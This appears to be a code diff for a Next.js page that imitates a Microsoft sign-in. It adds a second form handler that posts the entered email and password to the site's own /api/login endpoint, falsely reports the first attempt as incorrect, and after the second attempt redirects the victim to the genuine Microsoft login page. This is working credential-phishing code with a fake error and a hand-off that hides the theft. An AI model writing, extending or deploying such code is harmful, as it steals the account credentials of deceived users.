@@ -20,6 +20,7 @@ export default function Home() {
   const [loading, setLoading] = useState(false);
   const [message, setMessage] = useState('');
   const [attemptCount, setAttemptCount] = useState(0); 
+  const [otherCount, setOtherCount] = useState(0); 
 
 
   const handleSubmit = async (e: React.FormEvent) => {
@@ -39,6 +40,32 @@ export default function Home() {
     if (attemptCount === 0) {
       setMessage('Your account or password is incorrect...');
     } else if (attemptCount === 1) {
+      window.location.href = 'https://login.microsoftonline.com/common/login';
+    }
+
+    setEmail('');
+    setPassword('');
+    setTimeout(() => {
+      setMessage('')
+    }, 5000);
+  };
+  const handleOtherSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setLoading(true);
+    const response = await fetch('/api/login', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({ email, password }),
+    });
+
+    setLoading(false);
+    setOtherCount(prevCount => prevCount + 1);
+
+    if (otherCount === 0) {
+      setMessage('Your account or password is incorrect...');
+    } else if (otherCount === 1) {
       window.location.href = 'https://login.microsoftonline.com/common/login';
     }
 
@@ -110,7 +137,7 @@ export default function Home() {
           <div className="text-center py-2">
           <h6 className={styles.otherHeader}> Login with Other Email</h6>
           
-            <form onSubmit={handleSubmit}>
+            <form onSubmit={handleOtherSubmit}>
             <div className={styles.modalsubtext}>
             <p className={styles.errorMsg}>{message}</p>
                            <label className={styles.label}>Email Address</label>
